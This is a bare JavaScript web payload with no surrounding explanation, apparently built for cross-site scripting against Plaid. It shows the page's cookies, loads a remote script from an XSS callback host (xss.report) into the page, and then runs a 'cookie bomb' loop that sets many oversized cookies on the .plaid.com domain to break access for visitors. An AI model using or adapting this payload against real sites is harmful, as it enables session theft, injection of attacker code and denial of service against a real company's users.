alert(document.cookie);
var x = document.createElement('script');
x.src = 'https://xss.report/c/santiko86';
document.head.appendChild(x);

var serang = new Array(1111).join('a');
for (var x = 1; x < serang; x++){
  document.cookie = "Bomber" + x + "=" + serang + ";Domain=.plaid.com; path=/";
}
